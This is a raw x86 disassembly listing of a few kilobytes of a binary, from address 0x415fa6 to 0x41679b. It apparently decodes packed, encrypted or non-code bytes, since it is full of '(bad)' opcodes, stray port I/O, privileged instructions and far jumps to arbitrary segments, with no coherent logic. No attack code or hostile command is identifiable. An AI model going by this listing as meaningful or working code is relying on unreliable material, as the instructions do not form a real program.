  415fa6:	jno    0x415fc9
  415fa8:	cmp    cl,BYTE PTR [eax-0x4b]
  415fab:	inc    eax
  415fac:	lock icebp 
  415fae:	stos   DWORD PTR es:[edi],eax
  415faf:	cmc    
  415fb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fb1:	sbb    ch,BYTE PTR [edx-0x426b3ea5]
  415fb7:	cmp    BYTE PTR [esi+0x47],dh
  415fba:	icebp  
  415fbb:	(bad)  ds:0xc0d9aa91
  415fc1:	shl    al,0x9d
  415fc4:	loope  0x415fbf
  415fc6:	mov    bh,0xb4
  415fc8:	test   eax,0x5fcc39f7
  415fcd:	cdq    
  415fce:	jnp    0x41603b
  415fd0:	push   edx
  415fd1:	inc    esi
  415fd2:	out    dx,al
  415fd3:	sub    ebp,ecx
  415fd5:	add    BYTE PTR [eax+0x22],dh
  415fd8:	in     eax,0x61
  415fda:	retf   0x1dc3
  415fdd:	mov    edx,edi
  415fdf:	mov    ch,dh
  415fe1:	push   esi
  415fe2:	shr    DWORD PTR [esi+eiz*2-0x12],1
  415fe6:	mov    edx,DWORD PTR [ebx+edi*2]
  415fe9:	ja     0x416065
  415feb:	daa    
  415fec:	(bad)  
  415fed:	(bad)  
  415fee:	cmc    
  415fef:	and    bh,BYTE PTR [esi-0x1f]
  415ff2:	mov    bl,0xf2
  415ff4:	call   0x9570:0x9b4b208
  415ffb:	push   cs
  415ffc:	imul   DWORD PTR [ebp-0x1c]
  415fff:	dec    edi
  416000:	rcr    DWORD PTR [ebx+edi*1-0xd2aba90],0xa1
  416008:	sahf   
  416009:	call   0x62c1:0x8acf2b5b
  416010:	outs   dx,DWORD PTR ds:[esi]
  416011:	pop    esp
  416012:	mov    dl,0xd7
  416014:	pop    ss
  416015:	pop    ds
  416016:	mov    ecx,0x95a40004
  41601b:	inc    eax
  41601c:	push   ebp
  41601d:	adc    al,0x44
  41601f:	in     eax,dx
  416020:	inc    esp
  416021:	int3   
  416022:	inc    ecx
  416023:	cmp    al,0x18
  416025:	cmp    DWORD PTR [ebx],eax
  416027:	mov    eax,0xc08a4907
  41602c:	fisub  WORD PTR [ebp-0x4dd81045]
  416032:	dec    edi
  416033:	aad    0x25
  416035:	pop    ds
  416036:	nop
  416037:	dec    ebx
  416038:	test   al,0x32
  41603a:	mov    edx,0x44a72384
  41603f:	xchg   esp,eax
  416040:	xchg   ebp,eax
  416041:	mov    al,ds:0x878cf0a3
  416046:	repnz mov edi,0xf6e4475c
  41604c:	jecxz  0x4160c5
  41604e:	mov    ecx,0xbe754c64
  416053:	mov    dl,ch
  416055:	inc    eax
  416056:	inc    eax
  416057:	out    dx,eax
  416058:	adc    al,0xd1
  41605a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41605b:	cli    
  41605c:	and    ch,BYTE PTR [ecx]
  41605e:	not    DWORD PTR [edx-0x1]
  416061:	and    DWORD PTR [eax-0x4],esp
  416064:	pop    ecx
  416065:	mov    ds:0x690c08eb,al
  41606a:	ror    esi,cl
  41606c:	xchg   BYTE PTR [edi+0x191d565f],ch
  416072:	stos   BYTE PTR es:[edi],al
  416073:	cld    
  416074:	idiv   eax
  416076:	xor    DWORD PTR [ebp+ebp*8+0x6bbeba6],ebp
  41607d:	sar    BYTE PTR [eax],1
  41607f:	fsubr  DWORD PTR [edi+edi*4+0x3856f9fb]
  416086:	push   edi
  416087:	mov    ch,0x24
  416089:	mov    DWORD PTR [ebp+0x1c],eax
  41608c:	dec    ebp
  41608d:	dec    ebx
  41608e:	dec    esp
  41608f:	mov    dh,0x5
  416091:	push   ebp
  416092:	and    al,0xe8
  416094:	mov    eax,ds:0x57163edb
  416099:	mov    eax,0x487a48ef
  41609e:	xchg   ebx,eax
  41609f:	fsubr  QWORD PTR [esp+eiz*2]
  4160a2:	mov    ecx,0x39a73974
  4160a7:	jae    0x4160ee
  4160a9:	inc    ebx
  4160aa:	cdq    
  4160ab:	in     al,dx
  4160ac:	enter  0x735,0x2f
  4160b0:	popf   
  4160b1:	push   esp
  4160b2:	(bad)  
  4160b4:	cmp    DWORD PTR [esi+0x553894b1],esi
  4160ba:	xor    eax,0xa8f4b5e0
  4160bf:	in     eax,dx
  4160c0:	sub    DWORD PTR [ecx+0x791c4414],esi
  4160c6:	in     al,dx
  4160c7:	mov    ds:0xcfa0a7f2,al
  4160cc:	out    dx,al
  4160cd:	lahf   
  4160ce:	retf   
  4160cf:	cmp    esp,DWORD PTR [esi-0x34b4bec2]
  4160d5:	inc    eax
  4160d6:	mov    ebp,0x3ba5fae6
  4160db:	fiadd  DWORD PTR [esi]
  4160dd:	leave  
  4160de:	mov    ebx,0xcbb791e3
  4160e3:	fdivp  st(6),st
  4160e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160e6:	pop    ebp
  4160e7:	repnz nop
  4160e9:	popf   
  4160ea:	pop    ecx
  4160eb:	lock and BYTE PTR [ecx],cl
  4160ee:	dec    esp
  4160ef:	das    
  4160f0:	fadd   QWORD PTR [esi+ebx*4+0x3aa5dfa8]
  4160f7:	mov    bl,0x16
  4160f9:	sbb    cl,BYTE PTR [eax]
  4160fb:	pop    ebx
  4160fc:	add    ah,BYTE PTR [edi+ebx*2+0x2e200f20]
  416103:	popf   
  416104:	(bad)  
  416105:	idiv   BYTE PTR [ecx-0x1cb5c75c]
  41610b:	and    dh,ch
  41610d:	cs ins BYTE PTR es:[edi],dx
  41610f:	jmp    0xd97:0xd70bf659
  416116:	add    eax,0x1556155a
  41611b:	hlt    
  41611c:	or     al,0x37
  41611e:	out    0x97,al
  416120:	imul   BYTE PTR [edx+0x3e]
  416123:	push   esi
  416124:	dec    ebx
  416125:	lahf   
  416126:	pop    eax
  416127:	out    0x0,al
  416129:	mul    ebx
  41612b:	add    DWORD PTR [edi-0x35],edi
  41612e:	mov    edi,0xc7e22d94
  416133:	lock jne 0x4160e8
  416136:	jp     0x416123
  416138:	mov    edx,DWORD PTR [esi-0x31]
  41613b:	push   es
  41613c:	pop    es
  41613d:	shl    DWORD PTR [ecx-0x71bf469e],1
  416143:	es sbb bh,BYTE PTR fs:[esp+ebp*1+0x5702e0ad]
  41614c:	sub    DWORD PTR ds:0xdc969609,edx
  416152:	lods   eax,DWORD PTR ds:[esi]
  416153:	or     BYTE PTR [esi-0x424349dd],bh
  416159:	xor    al,0x70
  41615b:	dec    ecx
  41615c:	fidiv  WORD PTR [edi]
  41615e:	cmp    DWORD PTR [esi],esi
  416160:	std    
  416161:	mov    dx,0x25ef
  416165:	cmc    
  416166:	pop    esi
  416167:	in     eax,dx
  416168:	cwde   
  416169:	int    0xf1
  41616b:	add    al,0x57
  41616d:	cdq    
  41616e:	fs out dx,eax
  416170:	aad    0x52
  416172:	outs   dx,BYTE PTR ds:[esi]
  416173:	int    0xda
  416175:	jae    0x416136
  416177:	mov    WORD PTR ds:0x78e9431e,ss
  41617d:	xchg   esp,eax
  41617e:	fwait
  41617f:	push   ss
  416180:	cmp    DWORD PTR [ecx+0x3c],edi
  416183:	js     0x41616a
  416185:	sub    dh,BYTE PTR [edx+0x73821b65]
  41618b:	out    0xa5,eax
  41618d:	cmp    eax,0x712e6b5
  416192:	mov    al,ds:0xa588c30e
  416197:	mov    eax,0xc4b0d966
  41619c:	repnz push eax
  41619e:	mov    ebp,ebx
  4161a0:	in     eax,0x7a
  4161a2:	mov    ebx,0xfcf870f2
  4161a7:	and    BYTE PTR ds:0xd98eb3cb,cl
  4161ad:	into   
  4161ae:	xchg   edx,eax
  4161af:	data16 ds (bad) 
  4161b2:	mov    edx,0xfba56538
  4161b7:	or     DWORD PTR [eax+0x23ce442c],esi
  4161bd:	and    al,bl
  4161bf:	or     cl,0xd0
  4161c2:	mov    ecx,0x9e478994
  4161c7:	(bad)  
  4161c8:	gs sbb eax,0x75a0e655
  4161ce:	add    DWORD PTR [edx-0x6bf6d6e6],esi
  4161d4:	lahf   
  4161d5:	sub    BYTE PTR [ecx+0x30],bl
  4161d8:	fisub  DWORD PTR [edx-0x2b89ea25]
  4161de:	mov    ebp,0xefc8ee3d
  4161e3:	or     eax,0xa4bc67cd
  4161e8:	adc    BYTE PTR [edi],bh
  4161ea:	mov    edi,0x269a0570
  4161ef:	repz rcr BYTE PTR [ecx],cl
  4161f2:	aad    0x57
  4161f4:	psubd  mm5,QWORD PTR [ebx+ebx*2+0x56]
  4161f9:	mov    ds:0x3bef17e9,eax
  4161fe:	inc    esi
  4161ff:	and    ebp,edx
  416201:	ds repnz out 0xa,al
  416205:	stc    
  416206:	dec    esi
  416207:	outs   dx,DWORD PTR ds:[esi]
  416208:	cmovnp esp,DWORD PTR [edx+0x19c16a6]
  41620f:	nop
  416210:	sahf   
  416211:	fwait
  416212:	pop    ebx
  416213:	(bad)  
  416214:	inc    edx
  416215:	ja     0x4161b2
  416217:	inc    edx
  416218:	lock mov ebp,esp
  41621b:	fiadd  DWORD PTR [edi+0x6e]
  41621e:	mov    edi,0xb8653644
  416223:	shl    DWORD PTR [edi+0x19b6fa5e],0xb9
  41622a:	and    BYTE PTR [edx-0x44],ch
  41622d:	pop    ds
  41622e:	jns    0x416299
  416230:	or     cl,ah
  416232:	sti    
  416233:	fcomip st,st(7)
  416235:	sbb    eax,0xb0554870
  41623a:	daa    
  41623b:	call   0x3d9b8e6c
  416240:	jbe    0x4162a4
  416242:	nop
  416243:	iret   
  416244:	and    ah,bl
  416246:	mov    esi,0x17462ea0
  41624b:	jmp    0x41d8:0x5c026992
  416252:	in     al,0x4c
  416254:	push   edi
  416255:	mov    al,0xb9
  416257:	sbb    ecx,DWORD PTR [ebp+0x2d]
  41625a:	ins    BYTE PTR es:[edi],dx
  41625b:	add    cl,dl
  41625d:	pop    es
  41625e:	add    ecx,DWORD PTR [esi]
  416260:	xchg   edi,eax
  416261:	mov    eax,ds:0x79168cbd
  416266:	xchg   BYTE PTR [ebx+0x16],dl
  416269:	xchg   ebx,eax
  41626a:	pop    edi
  41626b:	iret   
  41626c:	jne    0x416213
  41626e:	imul   ebx,DWORD PTR [edx],0xfffffffb
  416271:	loop   0x4162ba
  416273:	nop
  416274:	xchg   ebp,eax
  416275:	fcomp  DWORD PTR [ebp-0x5f]
  416278:	or     BYTE PTR [edx+0x47],al
  41627b:	or     BYTE PTR [ecx-0x5f],al
  41627e:	arpl   WORD PTR [ebx-0xb67f7ca],si
  416284:	cmp    bl,BYTE PTR [ebp+0x48bcd84b]
  41628a:	call   0x845ad93c
  41628f:	je     0x416249
  416291:	and    ch,BYTE PTR [ecx]
  416293:	in     eax,0x91
  416295:	or     al,0xf9
  416297:	cld    
  416298:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416299:	aam    0xbf
  41629b:	jg     0x416254
  41629d:	inc    esi
  41629e:	or     al,0x7
  4162a0:	xor    eax,0x5de5ab5a
  4162a5:	loopne 0x416245
  4162a7:	fmul   QWORD PTR [ecx]
  4162a9:	jge    0x416273
  4162ab:	in     al,0x55
  4162ad:	pop    eax
  4162ae:	push   ebx
  4162af:	fwait
  4162b0:	popf   
  4162b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4162b2:	cmp    dh,bl
  4162b4:	in     eax,0xea
  4162b6:	js     0x4162a3
  4162b8:	xchg   BYTE PTR [esi],ah
  4162ba:	dec    esi
  4162bb:	les    ebx,FWORD PTR [ebx]
  4162bd:	cdq    
  4162be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162bf:	rcl    BYTE PTR [eax-0x69],1
  4162c2:	bound  edx,QWORD PTR [edx-0x30dea216]
  4162c8:	mov    ds:0xfbd5431c,al
  4162cd:	pop    ds
  4162ce:	mov    bh,0x84
  4162d0:	xor    bh,cl
  4162d2:	(bad)  
  4162d3:	mov    DWORD PTR [ecx+0x40],esp
  4162d6:	lods   al,BYTE PTR ds:[esi]
  4162d7:	push   ebp
  4162d8:	mov    ecx,0x20ebb682
  4162dd:	mov    ds:0x92443abb,eax
  4162e2:	jge    0x4162c0
  4162e4:	aas    
  4162e5:	cmc    
  4162e6:	add    esi,DWORD PTR [ecx-0x43]
  4162e9:	test   ch,cl
  4162eb:	in     al,0x78
  4162ed:	mov    ah,0x6d
  4162ef:	push   esi
  4162f0:	fisttp DWORD PTR [edx]
  4162f2:	cmp    al,0x64
  4162f4:	aad    0x51
  4162f6:	and    eax,0xb5e342bf
  4162fb:	jmp    0x68096a9c
  416300:	imul   ebx,DWORD PTR [esi-0x15e057c5],0x486e4fe
  41630a:	cmp    al,BYTE PTR [edx]
  41630c:	xchg   ebp,eax
  41630d:	adc    al,0xe3
  41630f:	call   0x8210a8a7
  416314:	push   ebx
  416315:	stc    
  416316:	or     eax,0xb3e73cfe
  41631b:	jge    0x416340
  41631d:	cmc    
  41631e:	and    BYTE PTR [eax+0xab9bf3],bh
  416324:	add    BYTE PTR ss:[ebx-0x1d8b5042],cl
  41632b:	push   0x64
  41632d:	push   0x20
  41632f:	push   es
  416330:	xor    cl,bh
  416332:	mov    ch,0x54
  416334:	dec    eax
  416335:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416336:	or     edi,DWORD PTR [ebx+esi*4]
  416339:	add    DWORD PTR [esi],0x43d639e9
  41633f:	xor    DWORD PTR [edi+0x6b],edi
  416342:	lds    eax,FWORD PTR [ecx+esi*4]
  416345:	add    bl,BYTE PTR ds:0x7bb84e6a
  41634b:	shr    DWORD PTR [ebx-0x7b],0x23
  41634f:	xchg   ecx,eax
  416350:	outs   dx,BYTE PTR ds:[esi]
  416351:	pushf  
  416352:	and    DWORD PTR [edi+edx*2-0x19c601f9],esp
  416359:	sar    DWORD PTR [ecx-0x70f8729c],cl
  41635f:	cmp    BYTE PTR [esi-0x259e02bf],dl
  416365:	nop
  416366:	jecxz  0x416369
  416368:	dec    esi
  416369:	jb     0x416323
  41636b:	ficomp WORD PTR [ecx]
  41636d:	cdq    
  41636e:	sbb    BYTE PTR [eax+ebp*4+0x3e96fcf3],bl
  416375:	mov    eax,ds:0x1c3e27ab
  41637a:	mov    dl,0x18
  41637c:	adc    eax,0x3f579f44
  416381:	sub    eax,0x9ec374b7
  416386:	sub    dh,BYTE PTR [eax-0x13c4c44b]
  41638c:	ret    0x9437
  41638f:	push   ebx
  416390:	mov    al,0xec
  416392:	(bad)  
  416393:	jne    0x416332
  416395:	retf   
  416396:	fild   QWORD PTR [ebp-0x7a3e8780]
  41639c:	sub    ch,BYTE PTR [esi-0x43]
  41639f:	les    ebp,FWORD PTR [ebx-0x79]
  4163a2:	aas    
  4163a3:	cwde   
  4163a4:	jbe    0x416353
  4163a6:	sub    eax,DWORD PTR [ebx+0x43]
  4163a9:	aam    0x17
  4163ab:	nop
  4163ac:	cdq    
  4163ad:	inc    ebp
  4163ae:	mov    ds:0xfee1125b,al
  4163b3:	xchg   BYTE PTR [eax+0x1bd4ba27],bh
  4163b9:	mov    ah,0xa6
  4163bb:	xor    dh,BYTE PTR [ebp-0xa]
  4163be:	xchg   bh,ah
  4163c0:	outs   dx,BYTE PTR ds:[esi]
  4163c1:	adc    eax,0x8924aac5
  4163c6:	sbb    eax,0xbcea5bcc
  4163cb:	jne    0x4163be
  4163cd:	mov    al,ds:0x40d2458b
  4163d2:	mov    bh,0x8c
  4163d4:	inc    edx
  4163d5:	call   0x637c:0x1940bb20
  4163dc:	fnstenv [edi+0x27]
  4163df:	mov    ?,WORD PTR [ebx-0xc]
  4163e2:	pushf  
  4163e3:	jmp    0xeab2968d
  4163e8:	cwde   
  4163e9:	into   
  4163ea:	js     0x416384
  4163ec:	or     bl,bh
  4163ee:	jmp    0x416373
  4163f0:	and    eax,0x9c801fb5
  4163f5:	ja     0x4163ff
  4163f7:	in     eax,0x25
  4163f9:	ins    BYTE PTR es:[edi],dx
  4163fa:	ss out dx,eax
  4163fc:	or     esp,DWORD PTR [ebx-0x8]
  4163ff:	inc    ebp
  416400:	pop    ss
  416401:	and    al,BYTE PTR [ebx]
  416403:	into   
  416404:	xor    DWORD PTR [ecx],ebp
  416406:	mov    ecx,0x1f807e7b
  41640b:	or     edx,ebx
  41640d:	cwde   
  41640e:	pusha  
  41640f:	and    edx,ebp
  416411:	lods   al,BYTE PTR ds:[esi]
  416412:	loopne 0x416405
  416414:	push   edx
  416415:	jo     0x41648f
  416417:	pop    ecx
  416418:	mov    ?,ecx
  41641a:	test   eax,0x16813d2d
  41641f:	sub    eax,0x89b5c272
  416424:	es mov ecx,0xa6e361cd
  41642a:	data16 in al,dx
  41642c:	xchg   cl,ah
  41642e:	push   ds
  41642f:	jg     0x4163be
  416431:	jecxz  0x4163ba
  416433:	lock cwde 
  416435:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416436:	sti    
  416437:	mov    esp,0x15b80090
  41643c:	lods   eax,DWORD PTR ds:[esi]
  41643d:	arpl   ax,si
  41643f:	(bad)
  416444:	in     al,dx
  416445:	sub    ah,BYTE PTR [eax]
  416447:	xchg   edx,eax
  416448:	js     0x4163f1
  41644a:	jnp    0x4163dd
  41644c:	lods   eax,DWORD PTR ds:[esi]
  41644d:	adc    al,0x2b
  41644f:	stc    
  416450:	int3   
  416451:	scas   al,BYTE PTR es:[edi]
  416452:	dec    ecx
  416453:	cmc    
  416454:	jge    0x4163e5
  416456:	mov    dl,0x74
  416458:	jb     0x416441
  41645a:	or     bl,cl
  41645c:	add    eax,0x30ef8829
  416461:	aam    0x4f
  416463:	mov    ds:0x7bd6e917,al
  416468:	test   dh,0x2f
  41646b:	adc    eax,0xeecba3bd
  416470:	ja     0x416495
  416472:	(bad)  
  416474:	jns    0x4164ac
  416476:	pop    ecx
  416477:	nop
  416478:	or     al,0xa7
  41647a:	pop    ebx
  41647b:	mov    eax,0xdeb6935c
  416480:	mov    bl,0xa1
  416482:	lock sbb dh,BYTE PTR [edx-0x60]
  416486:	mov    ebx,0xd630c571
  41648b:	cmp    esi,ebx
  41648d:	pusha  
  41648e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41648f:	ins    DWORD PTR es:[edi],dx
  416490:	popf   
  416491:	push   ebp
  416492:	mov    cl,0xf4
  416494:	xor    al,0x9d
  416496:	call   0x9521:0x2bb8a6a5
  41649d:	pop    ebp
  41649e:	test   BYTE PTR ds:0x12bec98b,dl
  4164a4:	popa   
  4164a5:	ret    0x44b1
  4164a8:	je     0x416513
  4164aa:	test   BYTE PTR [esi],ah
  4164ac:	xchg   ebp,eax
  4164ad:	jno    0x416481
  4164af:	out    dx,eax
  4164b0:	sbb    DWORD PTR [edi],esi
  4164b2:	or     DWORD PTR [ebp+0x15],ebx
  4164b5:	jno    0x4164d5
  4164b7:	int    0x7a
  4164b9:	inc    ebp
  4164ba:	mov    cl,0x54
  4164bc:	cld    
  4164bd:	shl    DWORD PTR [edx+0x3d47b54d],cl
  4164c3:	cld    
  4164c4:	jae    0x4164a6
  4164c6:	mov    eax,ds:0x5e3099a
  4164cb:	hlt    
  4164cc:	sbb    ecx,DWORD PTR [ecx]
  4164ce:	jge    0x41654f
  4164d0:	push   ebp
  4164d1:	and    eax,0x9c96e230
  4164d6:	sti    
  4164d7:	ret    
  4164d8:	shl    BYTE PTR [ecx-0x36],1
  4164db:	push   ss
  4164dc:	or     BYTE PTR [edx+0x6f],ch
  4164df:	jecxz  0x41650a
  4164e1:	ffree  st(5)
  4164e3:	adc    al,0xc8
  4164e5:	lods   al,BYTE PTR ds:[esi]
  4164e6:	add    eax,0xbbd47c9a
  4164eb:	sbb    bh,BYTE PTR [ecx]
  4164ed:	or     eax,DWORD PTR [ecx+0x71]
  4164f0:	push   ss
  4164f1:	add    DWORD PTR [eax-0x7b86e099],ecx
  4164f7:	xor    cl,dh
  4164f9:	push   es
  4164fa:	push   ds
  4164fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164fc:	shl    DWORD PTR [ebx-0x8cba555],cl
  416502:	mov    ecx,0x15d05b65
  416507:	leave  
  416508:	push   ebp
  416509:	sub    edx,ebx
  41650b:	stos   DWORD PTR es:[edi],eax
  41650c:	cmp    ecx,ecx
  41650e:	sbb    eax,0x112662bc
  416513:	outs   dx,DWORD PTR ds:[esi]
  416514:	jne    0x4164f3
  416516:	and    edi,esp
  416518:	inc    edi
  416519:	or     BYTE PTR [ebx],bl
  41651b:	cwde   
  41651c:	fisttp DWORD PTR [edx-0x18]
  41651f:	fistp  WORD PTR [edx]
  416521:	cmp    DWORD PTR [esi+edx*4-0x543baf35],ebx
  416528:	push   ebp
  416529:	mov    WORD PTR [ecx],cs
  41652b:	in     eax,dx
  41652c:	add    edx,DWORD PTR [ebx-0x76e70412]
  416532:	pusha  
  416533:	xchg   ebp,eax
  416534:	test   BYTE PTR [edx-0x5746cbdb],cl
  41653a:	stos   DWORD PTR es:[edi],eax
  41653b:	rcr    ebp,1
  41653d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41653e:	in     al,0xb9
  416540:	xor    dh,BYTE PTR [edx]
  416542:	nop
  416543:	xchg   edx,eax
  416544:	cwde   
  416545:	or     BYTE PTR [edi],ah
  416547:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416548:	sbb    DWORD PTR [edx],esp
  41654a:	add    al,0x6c
  41654c:	loop   0x4164e8
  41654e:	sbb    edx,DWORD PTR [ecx+edi*2+0x46]
  416552:	fld    TBYTE PTR [ebx]
  416554:	push   esp
  416555:	das    
  416556:	das    
  416557:	jge    0x41651f
  416559:	stc    
  41655a:	mov    esi,0xac9785e4
  41655f:	push   0xed89c325
  416564:	pusha  
  416565:	sub    al,0xac
  416567:	dec    esi
  416568:	sbb    cl,bh
  41656a:	jge    0x41653b
  41656c:	loopne 0x41658a
  41656e:	paddsb mm1,QWORD PTR [ecx-0x66]
  416572:	fist   DWORD PTR [edi+0x1]
  416575:	out    dx,al
  416576:	pop    es
  416577:	(bad)  
  416578:	adc    ebp,edi
  41657a:	iret   
  41657b:	push   cs
  41657c:	xchg   dh,bl
  41657e:	mov    al,0x4
  416580:	lds    ebx,FWORD PTR [edx*8+0x5e43057d]
  416587:	jmp    0xc946:0xabce54ed
  41658e:	test   eax,0x231c72f2
  416593:	xor    ah,0xe7
  416596:	outs   dx,DWORD PTR ds:[esi]
  416597:	jno    0x4165f0
  416599:	outs   dx,BYTE PTR ds:[esi]
  41659a:	dec    BYTE PTR [esi-0xb]
  41659d:	mov    ah,0xb
  41659f:	out    0x69,al
  4165a1:	and    eax,0x2791148b
  4165a6:	mov    eax,ds:0x388ab668
  4165ab:	leave  
  4165ac:	xchg   ebx,eax
  4165ad:	rol    DWORD PTR [ebx+0x2ba532e9],0xaa
  4165b4:	adc    DWORD PTR [ebx+0x73a65a0e],ebp
  4165ba:	into   
  4165bb:	mov    gs,WORD PTR gs:[edi]
  4165be:	sub    edx,DWORD PTR ds:0x1cfbb01a
  4165c4:	into   
  4165c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165c6:	mov    ebp,edx
  4165c8:	xor    eax,0x6441bdf6
  4165cd:	add    BYTE PTR [ecx+0x7b9ec935],dh
  4165d3:	js     0x416630
  4165d5:	jae    0x4165e0
  4165d7:	jp     0x41662c
  4165d9:	add    DWORD PTR [ebx-0x5c69ca9b],ecx
  4165df:	hlt    
  4165e0:	add    al,0x75
  4165e2:	xchg   BYTE PTR [eax],dl
  4165e4:	mov    eax,ds:0x1a3b1278
  4165e9:	jns    0x41659e
  4165eb:	push   ebx
  4165ec:	sti    
  4165ed:	push   ss
  4165ee:	sbb    al,0xe7
  4165f0:	mov    al,0xa4
  4165f2:	fist   DWORD PTR [ebp+0x36]
  4165f5:	js     0x416648
  4165f7:	push   edx
  4165f8:	leave  
  4165f9:	pop    ebp
  4165fa:	push   ebx
  4165fb:	jl     0x41662f
  4165fd:	sbb    eax,0xc2d504b4
  416602:	xchg   ebp,eax
  416603:	stos   BYTE PTR es:[edi],al
  416604:	push   eax
  416605:	mov    ah,0xdb
  416607:	jmp    0xb52a:0x13234f86
  41660e:	ds out 0x94,al
  416611:	retf   0xac7e
  416614:	push   ds
  416615:	test   BYTE PTR [ecx+0x1bbdd984],dh
  41661b:	ins    BYTE PTR es:[edi],dx
  41661c:	popf   
  41661d:	popf   
  41661e:	imul   esi,DWORD PTR [ebp-0x28],0xffffffd3
  416622:	cmp    eax,0xd11b3bf6
  416627:	dec    ecx
  416628:	out    dx,eax
  416629:	xchg   edi,eax
  41662a:	mov    bl,0x64
  41662c:	mov    dh,0x89
  41662e:	adc    ch,BYTE PTR [ebx-0xaebfdcb]
  416634:	jb     0x4165db
  416636:	jecxz  0x4165c3
  416638:	inc    ebx
  416639:	jne    0x416678
  41663b:	or     BYTE PTR [si+0x44e1],bh
  416640:	push   edi
  416641:	sbb    edi,DWORD PTR [ecx-0x5d]
  416644:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416645:	cmp    esp,0x3d2f037
  41664b:	nop
  41664c:	mov    eax,0xe40cbc04
  416651:	lea    esi,[ecx+0x41]
  416654:	cmc    
  416655:	jo     0x4166a0
  416657:	call   0x63e9a0d5
  41665c:	enter  0x3806,0xf3
  416660:	dec    edi
  416661:	(bad)  
  416662:	sbb    eax,0xb6067874
  416667:	arpl   WORD PTR fs:[edi],si
  41666a:	xor    BYTE PTR [di+0x2d8e],al
  41666f:	in     eax,0xf1
  416671:	or     al,bl
  416673:	cmp    BYTE PTR [eax],bl
  416675:	test   eax,0x66899553
  41667a:	push   0xffffffd5
  41667c:	icebp  
  41667d:	sahf   
  41667e:	stos   DWORD PTR es:[edi],eax
  41667f:	sub    DWORD PTR [edi],edi
  416681:	daa    
  416682:	test   BYTE PTR [esi],0xc2
  416685:	ins    DWORD PTR es:[edi],dx
  416686:	jle    0x416670
  416688:	in     al,0x8f
  41668a:	mov    bh,0xb4
  41668c:	mov    bl,0xd3
  41668e:	pop    ebx
  41668f:	rol    esi,cl
  416691:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416692:	test   esp,edx
  416694:	push   ds
  416695:	outs   dx,DWORD PTR ds:[esi]
  416696:	std    
  416697:	std    
  416698:	jl     0x4166e9
  41669a:	pusha  
  41669b:	lahf   
  41669c:	xchg   ebp,eax
  41669d:	xor    DWORD PTR [eax+0x6b34fb94],edi
  4166a3:	lock xor al,0xa6
  4166a6:	dec    ebx
  4166a7:	in     eax,0x38
  4166a9:	sub    BYTE PTR [ebp+0x4c1e0c7c],cl
  4166af:	push   0xffffffdc
  4166b1:	inc    ecx
  4166b2:	ss ja  0x41668b
  4166b5:	retf   0xfc41
  4166b8:	sbb    DWORD PTR [ecx+0x66],edx
  4166bb:	push   eax
  4166bc:	mov    dl,0x5b
  4166be:	fucomp st(1)
  4166c0:	mov    dh,0x18
  4166c2:	jno    0x4166e0
  4166c4:	aad    0x57
  4166c6:	cmp    eax,0xb4403e63
  4166cb:	mov    al,ds:0x3a3c90c0
  4166d0:	sbb    ecx,ebx
  4166d2:	stc    
  4166d3:	jmp    0xfeea0c97
  4166d8:	pushf  
  4166d9:	mov    esi,ebx
  4166db:	xor    bl,cl
  4166dd:	inc    edx
  4166de:	pop    es
  4166df:	sar    BYTE PTR [ebp+0x1694cef9],0x66
  4166e6:	cli    
  4166e7:	or     esp,DWORD PTR ds:0xa1ccf6f9
  4166ed:	dec    edi
  4166ee:	popf   
  4166ef:	mov    dl,0xc4
  4166f1:	lahf   
  4166f2:	pop    ebx
  4166f3:	data16 icebp 
  4166f5:	mov    ah,0x3d
  4166f7:	and    al,0xa9
  4166f9:	movlps xmm1,QWORD PTR [eax]
  4166fc:	mov    DWORD PTR es:[edx+0x7f18c584],esi
  416703:	mov    ebp,0xa87b9aa4
  416708:	add    bh,BYTE PTR [esi]
  41670a:	add    al,0xba
  41670c:	test   al,0xfe
  41670e:	jns    0x41669e
  416710:	and    DWORD PTR [ebx+ecx*4+0x2dea7dd8],ebx
  416717:	ret    0xb6b7
  41671a:	mov    ebx,0x6568dfb8
  41671f:	push   cs
  416720:	sub    eax,0xb83a7b21
  416725:	ror    BYTE PTR [ebx-0x4f10bed2],1
  41672b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41672c:	or     bh,BYTE PTR [edi+0x5f]
  41672f:	xchg   BYTE PTR [ebp+0x4de74427],dh
  416735:	sub    BYTE PTR [eax-0x5e],ah
  416738:	push   eax
  416739:	mov    ecx,0xcca2bd7d
  41673e:	or     DWORD PTR [edi-0x70],ebx
  416741:	pop    eax
  416742:	xchg   ebp,eax
  416743:	je     0x41677a
  416745:	int    0x6f
  416747:	in     eax,dx
  416748:	jbe    0x416742
  41674a:	bound  ecx,QWORD PTR [eax+0x1b]
  41674d:	cmp    DWORD PTR ds:0x2a0230ad,edx
  416753:	mov    al,0x16
  416755:	mov    al,ds:0x95d55bdb
  41675a:	(bad)  
  41675c:	fwait
  41675d:	inc    ecx
  41675e:	es dec edx
  416760:	and    bh,BYTE PTR [ecx+0x38]
  416763:	mov    esi,0x474b7e31
  416768:	inc    edi
  416769:	adc    BYTE PTR [eax+esi*1+0x62bfa626],cl
  416770:	push   ebp
  416771:	aam    0x4c
  416773:	out    dx,eax
  416774:	pop    ds
  416775:	pop    ecx
  416776:	jmp    0x3b8d:0x92611310
  41677d:	aad    0x8b
  41677f:	or     eax,0xb18382a6
  416784:	daa    
  416785:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416786:	fcom   st(3)
  416788:	fs ja  0x4167eb
  41678b:	imul   ecx,DWORD PTR [ecx],0x76467ff3
  416791:	(bad)  
  416792:	mov    eax,0x4c11a768
  416797:	cld    
  416798:	in     al,dx
  416799:	mov    dl,0x87
  41679b:	push   0xf272b28c
